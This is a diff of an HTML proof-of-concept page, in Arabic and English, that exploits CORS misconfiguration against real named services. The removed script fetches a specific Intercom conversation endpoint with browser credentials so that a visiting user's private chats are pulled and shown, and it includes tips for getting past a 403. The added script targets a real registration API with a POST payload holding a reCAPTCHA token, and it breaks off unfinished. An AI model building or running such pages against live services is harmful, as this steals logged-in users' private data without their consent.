@@ -2,64 +2,40 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>إثبات ثغرة CORS - تسريب بيانات Intercom</title>
+    <title>Exploit PoC - CORS Information Disclosure</title>
     <style>
-        body { font-family: sans-serif; direction: rtl; padding: 50px; background-color: #f5f5f5; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
-        h1 { color: #e74c3c; }
-        #status { font-weight: bold; margin: 20px 0; color: #555; }
-        pre { background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 5px; overflow-x: auto; text-align: left; direction: ltr; }
-        .success { color: #27ae60; border: 2px solid #27ae60; padding: 10px; border-radius: 5px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #eee; padding: 40px; line-height: 1.6; }
+        .card { background: #2d2d2d; border: 1px solid #444; padding: 25px; border-radius: 12px; max-width: 900px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #ff4d4d; border-bottom: 2px solid #444; padding-bottom: 10px; }
+        .status-box { padding: 10px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; background: #3d3d3d; text-align: center; }
+        pre { background: #000; color: #00ff00; padding: 20px; border-radius: 8px; overflow-x: auto; font-size: 13px; border: 1px solid #333; max-height: 500px; }
+        .highlight { color: #f1c40f; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>تنبيه: تم كشف ثغرة CORS Misconfiguration</h1>
-    <p>هذه الصفحة تحاول سحب محادثاتك الخاصة من Intercom لإثبات ضعف الإعدادات.</p>
+    <h2>CORS Exploit Proof of Concept</h2>
+    <p>هذا المتصفح يقوم الآن بمحاكاة هجوم <span class="highlight">Cross-Origin Resource Sharing</span> لسحب بيانات الحساب.</p>
     
-    <div id="status">جاري إرسال الطلب...</div>
-    <pre id="output">في انتظار البيانات...</pre>
+    <div id="status" class="status-box">جاري إرسال طلب POST...</div>
+    
+    <h3>البيانات المسحوبة من السيرفر:</h3>
+    <pre id="output">بانتظار استلام الرد...</pre>
 </div>
 
 <script>
-    async function exploit() {
-        // الرابط الذي وجدته في Burp Suite
-        const targetUrl = "https://api-iam.intercom.io/messenger/web/conversations/215474041396551";
-        const statusDiv = document.getElementById('status');
-        const outputPre = document.getElementById('output');
+    // الرابط المستهدف بناءً على طلبك
+    const targetUrl = "https://register.visitcloud.com/api/registrationlogin?=http://google.com";
 
-        try {
-            const response = await fetch(targetUrl, {
-                method: "GET",
-                mode: "cors",
-                credentials: "include", // هذا هو الجزء الأخطر الذي يسمح بسحب الكوكيز
-                headers: {
-                    "Accept": "*/*",
-                    // ملاحظة: إذا استمر الـ 403، جرب حذف الترويسة التالية
-                    "X-Intercom-App": "ineyz1by" 
-                }
-            });
-
-            if (response.ok) {
-                const data = await response.json();
-                statusDiv.innerHTML = "<div class='success'>✅ تم سحب البيانات بنجاح! السيرفر مصاب.</div>";
-                outputPre.textContent = JSON.stringify(data, null, 4);
-            } else if (response.status === 403) {
-                statusDiv.innerHTML = "❌ خطأ 403: السيرفر استلم الطلب لكن الجلسة غير صالحة أو ينقص ترويسة User-Data.";
-                outputPre.textContent = "الاستجابة: Forbidden";
-            } else {
-                statusDiv.innerHTML = "❌ فشل الطلب: كود الحالة " + response.status;
-            }
-        } catch (err) {
-            statusDiv.innerHTML = "❌ خطأ في الاتصال: قد يكون المتصفح حظر الطلب (CORS Blocked).";
-            outputPre.textContent = err.toString();
-        }
-    }
-
-    // تشغيل الهجوم
-    exploit();
-</script>
-
-</body>
-</html>
+    // البيانات (Payload) التي أرفقتها في رسالتك
+    const dataPayload = {
+        "surveyID": "3h239cufmkjme",
+        "method": "contactCode",
+        "queryString": "utm_source=connect.onegiantleap.com&utm_medium=referral&utm_campaign=Unspecified&utm_content=null&_gl=1*1g0cr2b*_gcl_au*MTY1NDQ5MTgyMi4xNzc2OTg5Mzcy*_ga*NDk1NTc2NjAxLjE3NzY5Nzk3Mzg.*_ga_W35LW3L53L*czE3NzY5ODkzNzQkbzEkZzEkdDE3NzY5ODk3MjkkajU5JGwwJGgw",
+        "code": "epFest2026",
+        "visitorID": {},
+        "recaptcha": {
+            "required": {},
+            "siteKey": {},
+            "response": "0cAFcWeA4Wqh3YcIJ3i0gI9RHCiJaIahRKPdfUbB9qTxAa-K71kL49nUXGYMmz3Tv1ROKVoBBMsr0gzTBJSlAb27Wq44rrRRMP-RAswTkRcOOiznC8ZcbxRJFK_6w6DfQ8TYfYM3L1zEyUqyqZm_xsVMl18e0kYKZXklxb2MxMbCsCIak9PQ0lMEtb52A5Vq_3GESDurAp4-WBcPNm48ZoGaHMAMK-baHkN6OsxqetYC9ddLYyXdW86uBGEqxZZt96yJZ8CpEpyG8CAjGvxsYyU2rIzen8Q5b__nevRV3DXqP3Dbersvn9vyML1JvBUhNGhiIeHqsCgSrhtj4m38wWm2Hq62WUhXqag6Et2955nN3ijd23HD-_-D06HwTAXRU9zCF0cGY8QK9CUInaQmc1_bHT7YKaW1We2tp_nkFF5xP0lapGNoVngGO0ZJ8coBIVsemDUOf3tBJ3hoq-hr9C94h01sNOEuSvTUc1cUC8BpW6_knUj77nnynZMVtj-aE0zXM-2KshKF8ZJye14qFMwjdRwRDAtLFpkEDrO3rwfZXtkJNMrwapJw-OkCn5XNBih_FWButUmcCa2mLRHl5vqgoPmv1HsEGB1sLiZ-ia0XzWUZBpHWRk1jOKg533BXWnN6ila7N9_gmu63puGPi7lvHdGUPLxsiIOrWTSh1oWqUSJF89YlK9Nr62xZGvddrksFgPuBBpl0FFWWPlTh4FBnJK5H9lrdCPOLEoc31HjOz6_RzY7yG0Dn8y-YUISu4HsERPwpJpazyZY9B6NlYyL7wNpYnQPdm0LGVSIFI0RIz-Xylfm-VghPtaiVkHzOU--tTPkR5jMm6D0m9rF0rB_VHLiOcWAjzYsvQg7PC7CIPjRrr1dPKHBT-XvcZ-gJ8nTjLSkqX1xpULZQetHyJj4sCJ4Ijv7O7B4v08UbbAmP0SWKcE2-Hxu0CQC9CYFjcHeuPC6UNZcCP21Lp3gugI9IEqgTiDJYRoHvkWkdW5TZZQq17bEOPrYzIK9dz1h3514aE2_AF-NXDd98kift9rbHW5byCM0m-H0Vxgpg8GFfvDa9MmglC9-itr4oyuQh6V1cIfC1qWTaNZjILGowpOqI0VQCN5nBvWyJHQejj-nNTGChrHIGbU7qqurc-RLTyJ3Aw-XRKYc6FP7SJExa-bYe2MslygifOkHCn-MVtJEUq15bI6fqjMW8ljBNy8hutX4vxyYL6nqo7VyakHdVPtY6mXtGjnv1lHnqJyZiS8m2mpWPBJICB1ZGsnIigKsy1WGDHh2658_9aw2NFA8HvCudB0uXrcgX9rBI7vlApCPtZ5GYWgMOe6eWk2y1BSaDCqGxzSX0r7rFPirNuW1j0qoE0l1OhUcJUikoJG0iY06BaW7hN3WXyiC5b_oZSozRhH1CwzaQPdcMOD4MKqjLCVTO9rkNp94yikCW7Cy9CSeJm7uUTVJTAWiuJgETbkz_-FcTkgIQx_MRq202ddZzZ4rYDIgD93EtrILlWpIzHk6JdyYI_L2g0i7vtflnZi5g2fbl5M7xQfgtmAr3e9NBh_9z3QFwqv3hyPGs-20CX32q6sL94cOZY_eJEcXEU2lIaFGUQaiD7wZ4ajJD_mK3Agf7TBCfh7YdbKORqhQO_DpmXYW8VHki_mxIO7SRJuQbctCc3uqStfQbBf1JTnPMPdVg9b1L_zEzEaS_-ptijQmj1JU9iBFv6zZbDaU1xgj7NiArelEHUo7i1sKZR6pdJUg5aeuhPTAo5MdQuPvpWcPehz2qvF9WYulSxN-hLnL_950DLZKOEpB2OH3ux9N26meUiPe1mVkzKj5c3BTjJxy2Ytxy2Y7UBIeDVFiAMwnOIdaHgXlV9YnNVqjw-4wEjhuQDNypljbz6g8X0OEwQuD-eRZnCFwpyYqshJ0X09rN5OjJTNRaPRDbCaPOBKEjW0mMeNWgU-4rvO5Sa5tHBJAiLojC42Bu4xwGNia1Hojok0unh2g3kG6Tu6O3YLMn564eK-iq1A6nDR2VxtTVU6_8uI3jkA5C4s9wtUSv_KyeUHQjNV7CfwBNAJSoFN3F0tD-W4fnQxBpW
